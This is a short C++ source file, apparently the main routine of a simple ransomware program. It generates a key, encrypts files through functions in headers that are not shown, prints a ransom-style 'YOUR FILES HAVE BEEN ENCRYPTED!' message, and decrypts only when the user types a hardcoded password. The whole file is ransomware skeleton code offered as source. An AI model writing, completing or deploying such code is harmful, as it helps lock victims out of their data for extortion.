#include <iostream>
#include "encryption.h"
#include "decryption.h"
#include "key.h"

using namespace std;


int main()
{
	string key = generateKey();	
	
	encrypt(key);
	string password = "cant_be_reverse_engineered";
	cout << "YOUR FILES HAVE BEEN ENCRYPTED!";
	cout << endl;
	cout << "ENTER THE KEY TO DECRYPT THEM: ";
	while(1) 
	{
		string receivedKey;
		cin >> receivedKey;

		if (receivedKey == password)
		{
			cout << "Correct key!";
			decrypt(key);
			break;
		}
	}
}

